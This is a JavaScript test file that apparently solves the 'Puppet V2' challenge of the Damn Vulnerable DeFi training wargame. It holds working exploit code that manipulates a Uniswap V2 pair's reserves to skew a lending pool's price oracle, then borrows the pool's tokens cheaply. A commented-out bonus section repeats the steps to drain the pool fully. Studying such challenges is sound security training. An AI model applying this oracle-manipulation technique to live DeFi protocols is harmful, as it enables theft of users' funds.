const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");
const factoryUniswapV2ABI = require("@uniswap/v2-core/build/IUniswapV2Factory.json").abi;
const routerUniswapV2ABI = require("@uniswap/v2-periphery/build/UniswapV2Router02.json").abi;
const UniswapV2PairABI = require("@uniswap/v2-core/build/IUniswapV2Pair.json").abi;
const WETH_ABI = require("@uniswap/v2-periphery/build/WETH9.json").abi;


describe("PuppetV2 Damn Vulnerable DEFI", function(){


    let owner, account1, account2, account3, hacker,
        PuppetV2Pool, puppetV2Pool, DVT, dvt;


    let wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    let uniswapFactoryAddress = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
    let uniswapRouterAddress = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    let uniswapFactory;
    let uniswapRouter;
    let uniswapPair;
    let WETH;


    before(async()=>{

        [owner, account1, account2, account3, hacker] = await ethers.getSigners();


        //Deploy DamnValuableToken
        DVT = await ethers.getContractFactory("DamnValuableToken");
        dvt = await DVT.deploy();
        await dvt.deployed();



        uniswapFactory = await ethers.getContractAt(factoryUniswapV2ABI, uniswapFactoryAddress, owner);
        uniswapRouter = await ethers.getContractAt(routerUniswapV2ABI, uniswapRouterAddress, owner);



        //Create WETH/DVT Pool on UniswapV2
        await uniswapFactory.createPair(wethAddress, dvt.address);

        //Get Pair Address
        let pairAddress = await uniswapFactory.getPair(wethAddress, dvt.address);
        console.log("WETH/DVT Pair Address:", pairAddress);
        console.log("");


        //Get contract Pair
        uniswapPair = await ethers.getContractAt(UniswapV2PairABI, pairAddress, owner);


        //Aprrove DVT Tokens to Fill the Pool
        await dvt.approve(uniswapRouter.address, ethers.utils.parseEther("10000"));


        
        ////Add Liquidity to the pair 10 WETH / 100 DVT Tokens
        await uniswapRouter.addLiquidityETH(
            dvt.address,
            ethers.utils.parseEther("100"),
            ethers.utils.parseEther("100"),
            ethers.utils.parseEther("10"),
            owner.address,
            (await ethers.provider.getBlock("latest")).timestamp * 2,
            {value: ethers.utils.parseEther("10")}
        );


        // Get Reserves Of The Pair
        let [reserveDVT, reserveWETH] = await uniswapPair.getReserves()
        console.log("Reserve DVT:", (reserveDVT/10**18).toString(), "DVT");
        console.log("Reserve WETH:", (reserveWETH/10**18).toString(), "WETH");
        console.log("");



        //Hacker start with 20 ETH and 10000 DVT
        await dvt.transfer(hacker.address, ethers.utils.parseEther("10000"));

        let hackerDVTBalance = await dvt.balanceOf(hacker.address);
        console.log("Hacker DVT Balance:", (hackerDVTBalance/10**18).toString(), "DVT");
        console.log("");


        //Deploy Puppet Pool
        PuppetV2Pool = await ethers.getContractFactory("PuppetV2Pool");
        puppetV2Pool = await PuppetV2Pool.deploy(
            wethAddress,
            dvt.address,
            pairAddress,
            uniswapFactory.address
        );

        await puppetV2Pool.deployed();


        //Pool Start with 1 MLN DVT Tokens in balance
        await dvt.transfer(puppetV2Pool.address, ethers.utils.parseEther("1000000"));

        let poolDVTBalance = await dvt.balanceOf(puppetV2Pool.address);
        console.log("PuppetV2Pool DVT Balance:", (poolDVTBalance/10**18).toString(), "DVT");
        console.log("");


        //Calculate the amount of ETH  we should deposit to puppet pool to have all the 1 MLN tokens from it
        let amountWETHToDeposit = await puppetV2Pool.calculateDepositOfWETHRequired(poolDVTBalance);
        console.log("WETH Amount to Deposit for the entire DVT Balance from PuppetPool:",
            (amountWETHToDeposit/10**18).toString(), "WETH");
        console.log("");


        //WETH Contract
        WETH = await ethers.getContractAt(WETH_ABI, wethAddress, owner);
    });




    // Hacker start 20 ETH and 10000 DVT
    it("Exploit",async()=>{

        let hackerDVTBalance = dvt.balanceOf(hacker.address);

        await dvt.connect(hacker).approve(uniswapRouter.address, hackerDVTBalance);

        //Add 10000 Tokens from hacker, to manipulate reserves of the uniswapV2Pair
        await uniswapRouter.connect(hacker).swapExactTokensForETH(
            hackerDVTBalance,
            1,
            [dvt.address, wethAddress],
            hacker.address,
            (await ethers.provider.getBlock("latest")).timestamp * 2,
        );

        console.log("");
        console.log("-------- After Manipulation ----------");
        console.log("");


        //New Reserves of uniswapV2Pair after first manipulation
        // ==> Reserve DVT: 10099.999999999998 DVT, Reserve WETH: 0.09930486593843098 WETH
        let [reserveDVT, reserveWETH] = await uniswapPair.getReserves()
        console.log("Reserve DVT:", (reserveDVT/10**18).toString(), "DVT");
        console.log("Reserve WETH:", (reserveWETH/10**18).toString(), "WETH");
        console.log("");


        //Get The amount of DVT Tokens in PuppetPool
        let poolDVTBalance = await dvt.balanceOf(puppetV2Pool.address);


        //Calculate the amount of ETH  we should deposit to puppet pool to have all the 1 MLN tokens from it
        //Result is around 29 ether
        let amountWETHToDeposit = await puppetV2Pool.calculateDepositOfWETHRequired(poolDVTBalance);
        console.log("WETH Amount to Deposit for the entire DVT Balance from PuppetPool After Manipulation:",
            (amountWETHToDeposit/10**18).toString(), "WETH");
        console.log("");


        //We have only 20 Ethers to start so we must to do same operations to drain all the DVT tokens
        let amountMaxInBorrow15Ether = poolDVTBalance.mul(ethers.utils.parseEther("15")).div(amountWETHToDeposit);


        //Change from ETH to WETH
        await WETH.connect(hacker).deposit({value: ethers.utils.parseEther("20")});


        //Approve puppetPool
        await WETH.connect(hacker).approve(puppetV2Pool.address, amountMaxInBorrow15Ether);


        //Ask for borrow in puppetPool
        await puppetV2Pool.connect(hacker).borrow(amountMaxInBorrow15Ether);

        //Check The balance of the pool after manipulation
        let puppetPoolDVTBalanceAfterFirstManipulation = await dvt.balanceOf(puppetV2Pool.address);
        console.log("PuppetPool DVT Balance After First Manipulation:",
            (puppetPoolDVTBalanceAfterFirstManipulation/10**18).toString(), "DVT"
        );
        console.log("");


        let hackerDVTBalanceAfterManipulation = await dvt.balanceOf(hacker.address);
        console.log("Hacker DVT Balance After First Manipulation:",
            (hackerDVTBalanceAfterManipulation/10**18).toString(), "DVT"
        );
        console.log("");






        //// BONUS: If We want to drain entirely the puppet pool we can use this code
        //
        ///// _____________________________________//////
        //
        //
        // //We have now a big amount of DVT and we are going to approve it again
        //let hackerDVTBalanceAfterFirstManipulation = await dvt.balanceOf(hacker.address);
        //console.log("Hacker DVT Balance After First Manipulation:",
        //    (hackerDVTBalanceAfterFirstManipulation/10**18).toString(), "DVT"
        //);
        //console.log("");
        //
        //await dvt.connect(hacker).approve(uniswapRouter.address, hackerDVTBalanceAfterFirstManipulation);
        //
        //
        // //Swap To manipulate again price
        //await uniswapRouter.connect(hacker).swapExactTokensForETH(
        //    hackerDVTBalanceAfterFirstManipulation,
        //    1,
        //    [dvt.address, wethAddress],
        //    hacker.address,
        //    (await ethers.provider.getBlock("latest")).timestamp * 2,
        //);
        //
        //
        // //New Reserves of uniswapV2Pair After second manipulation
        // // ==> Reserve DVT: 20100 DVT, Reserve WETH: 0.049974048130451074 WETH
        //let [reserveDVTAgain, reserveWETHAgain] = await uniswapPair.getReserves()
        //console.log("Reserve DVT After Second Manipulation:", (reserveDVTAgain/10**18).toString(), "DVT");
        //console.log("Reserve WETH After Second Manipulation:", (reserveWETHAgain/10**18).toString(), "WETH");
        //console.log("");
        //
        //
        //let poolDVTBalanceAfterFirstManipulation = await dvt.balanceOf(puppetV2Pool.address);
        //
        //
        //
        // //Calculate the amount of ETH  we should deposit to puppet pool to have all the rest of the tokens
        //let amountWETHToDepositAgain = await puppetV2Pool.calculateDepositOfWETHRequired(poolDVTBalanceAfterFirstManipulation);
        //console.log("WETH Amount to Deposit for the entire DVT Balance from PuppetPool After Manipulation:",
        //    (amountWETHToDepositAgain/10**18).toString(), "WETH");
        //console.log("");
        //
        //
        //await puppetV2Pool.connect(hacker).borrow(poolDVTBalanceAfterFirstManipulation);
        //
        //
        //let hackerDVTBalanceAfterSecondManipulation = await dvt.balanceOf(hacker.address);
        //console.log("Hacker DVT Balance After Second Manipulation:",
        //    (hackerDVTBalanceAfterSecondManipulation/10**18).toString(), "DVT"
        //);
        //console.log("");
        //
        //
        //let poolDVTBalanceAfterSecondManipulation = await dvt.balanceOf(puppetV2Pool.address);
        //console.log("Pool DVT Balance After Second Manipulation:",
        //    (poolDVTBalanceAfterSecondManipulation/10**18).toString(), "DVT"
        //);

    });
})